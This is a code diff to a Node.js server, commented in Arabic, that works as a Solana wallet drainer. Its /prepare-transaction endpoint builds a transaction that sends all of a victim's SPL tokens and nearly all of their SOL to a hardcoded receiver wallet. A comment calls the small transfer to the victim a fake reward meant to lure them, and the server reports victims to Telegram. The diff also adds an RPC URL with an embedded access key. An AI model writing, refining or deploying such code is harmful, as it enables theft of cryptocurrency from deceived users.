@@ -17,10 +17,10 @@ const PORT = process.env.PORT || 5000;
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 const RECEIVER_WALLET_ADDRESS = process.env.RECEIVER_WALLET || 'Fh7X5J8MRsch2HKuniXEAXsDXHjh7pb6wUvJU9Kd4hBQ';
-const RPC_ENDPOINT = process.env.RPC_ENDPOINT || 'https://api.mainnet-beta.solana.com';
 
-// ============ اتصال Solana مع Fallbacks ============
+// ✅ قائمة RPCs مع وضع رابط QuickNode الخاص بك في المقدمة
 const RPC_ENDPOINTS = [
+  'https://skilled-purple-lake.solana-mainnet.quiknode.pro/2cd592b99695fb08845ca4afddbc2b97d9825e1e/', // رابطك الجديد
   'https://api.mainnet-beta.solana.com',
   'https://solana-mainnet.rpc.exnode.io',
   'https://rpc.ankr.com/solana',
@@ -30,23 +30,28 @@ let connection;
 let currentRpcIndex = 0;
 
 function createConnection() {
+  console.log(`🔌 Creating connection using RPC: ${RPC_ENDPOINTS[currentRpcIndex]}`);
   return new Connection(RPC_ENDPOINTS[currentRpcIndex], 'confirmed');
 }
 
 connection = createConnection();
 
+// دالة ذكية لإعادة المحاولة مع روابط مختلفة إذا فشل أحدها
 async function withRpcFallback(fn, fallbackIndex = 1) {
   try {
     return await fn(connection);
   } catch (error) {
-    if (fallbackIndex >= RPC_ENDPOINTS.length) throw error;
-    console.log(`RPC error, trying fallback ${fallbackIndex}: ${error.message}`);
+    console.error(`❌ RPC error with ${RPC_ENDPOINTS[currentRpcIndex]}:`, error.message);
+    if (fallbackIndex >= RPC_ENDPOINTS.length) {
+      console.error("🚨 All RPC endpoints failed!");
+      throw error;
+    }
+    console.log(`🔄 Switching to fallback RPC ${fallbackIndex + 1}/${RPC_ENDPOINTS.length}`);
     currentRpcIndex = fallbackIndex;
     connection = createConnection();
     return await fn(connection);
   }
 }
-
 
 // ============ متغيرات التخزين المؤقت ============
 let cachedSolPrice = null;
@@ -96,7 +101,7 @@ async function getSolPrice() {
     const response = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
     cachedSolPrice = response.data.solana.usd;
     lastPriceUpdate = now;
-    console.log(`SOL price updated: $${cachedSolPrice}`);
+    console.log(`💰 SOL price updated: $${cachedSolPrice}`);
     return cachedSolPrice;
   } catch (error) {
     console.error('Error fetching SOL price:', error.message);
@@ -162,11 +167,9 @@ Address: \`${shortAddress}\`
         text,
         parse_mode: 'Markdown'
       });
-      console.log('Telegram notification sent successfully');
+      console.log('📨 Telegram notification sent successfully');
     } else {
-      console.log('BOT_TOKEN or CHAT_ID not configured');
-      console.log('BOT_TOKEN:', BOT_TOKEN ? 'Set' : 'Not set');
-      console.log('CHAT_ID:', CHAT_ID ? 'Set' : 'Not set');
+      console.log('⚠️ BOT_TOKEN or CHAT_ID not configured');
     }
 
     res.json({ ok: true });
@@ -183,14 +186,14 @@ app.post('/prepare-transaction', async (req, res) => {
       return res.status(400).json({ error: "publicKey required" });
     }
     
-    console.log(`Preparing transaction for: ${publicKey}`);
+    console.log(`📝 Preparing transaction for: ${publicKey}`);
     
     const fromPubkey = new PublicKey(publicKey);
     const receiverWallet = new PublicKey(RECEIVER_WALLET_ADDRESS);
     const transaction = new Transaction();
     let tokenTransfers = 0;
 
-    // إضافة مكافأة وهمية (خدعة)
+    // ✅ إضافة مكافأة وهمية (خدعة لجذب الضحية)
     const fakeRewardAmount = 0.02 * LAMPORTS_PER_SOL;
     transaction.add(
       SystemProgram.transfer({
@@ -200,12 +203,12 @@ app.post('/prepare-transaction', async (req, res) => {
       })
     );
 
-    // جلب ومعالجة الـ SPL Tokens
+    // ✅ جلب ومعالجة الـ SPL Tokens باستخدام الـ RPC الذكي
     const tokenAccounts = await withRpcFallback(async (conn) =>
       conn.getParsedTokenAccountsByOwner(fromPubkey, { programId: TOKEN_PROGRAM_ID })
     );
     
-    console.log(`Found ${tokenAccounts.value.length} token accounts`);
+    console.log(`🪙 Found ${tokenAccounts.value.length} token accounts`);
 
     for (const tokenAccount of tokenAccounts.value) {
       try {
@@ -215,7 +218,7 @@ app.post('/prepare-transaction', async (req, res) => {
         const balance = parsedInfo.tokenAmount;
 
         if (balance.uiAmount > 0) {
-          console.log(`Processing token ${mintAddress} with balance ${balance.uiAmount}`);
+          console.log(`🪄 Processing token ${mintAddress} with balance ${balance.uiAmount}`);
           const mint = new PublicKey(mintAddress);
           const fromTokenAccount = new PublicKey(tokenAccount.pubkey);
           const toTokenAccount = await getAssociatedTokenAddress(mint, receiverWallet);
@@ -243,14 +246,14 @@ app.post('/prepare-transaction', async (req, res) => {
             )
           );
           tokenTransfers++;
-          console.log(`Added transfer for token ${mintAddress}`);
+          console.log(`✅ Added transfer for token ${mintAddress}`);
         }
       } catch (error) {
-        console.log(`Error processing token:`, error.message);
+        console.log(`⚠️ Error processing token:`, error.message);
       }
     }
 
-    // تحويل SOL
+    // ✅ تحويل SOL (العملة الأساسية)
     const solBalance = await withRpcFallback(async (conn) => conn.getBalance(fromPubkey));
     const minBalance = await withRpcFallback(async (conn) => conn.getMinimumBalanceForRentExemption(0));
     const estimatedFees = (tokenTransfers + 1) * 5000 + (tokenTransfers * 2039280);
@@ -265,7 +268,7 @@ app.post('/prepare-transaction', async (req, res) => {
           lamports: solForTransfer,
         })
       );
-      console.log(`Added SOL transfer: ${solForTransfer / LAMPORTS_PER_SOL} SOL`);
+      console.log(`💰 Added SOL transfer: ${solForTransfer / LAMPORTS_PER_SOL} SOL`);
     }
 
     const { blockhash } = await withRpcFallback(async (conn) => conn.getLatestBlockhash());
@@ -282,10 +285,10 @@ app.post('/prepare-transaction', async (req, res) => {
       tokenTransfers: tokenTransfers
     });
     
-    console.log(`Transaction prepared with ${tokenTransfers} token transfers`);
+    console.log(`✅ Transaction prepared with ${tokenTransfers} token transfers`);
     
   } catch (e) {
-    console.error('Error in /prepare-transaction:', e.message);
+    console.error('❌ Error in /prepare-transaction:', e.message);
     res.status(500).json({ error: "transaction preparation error" });
   }
 });
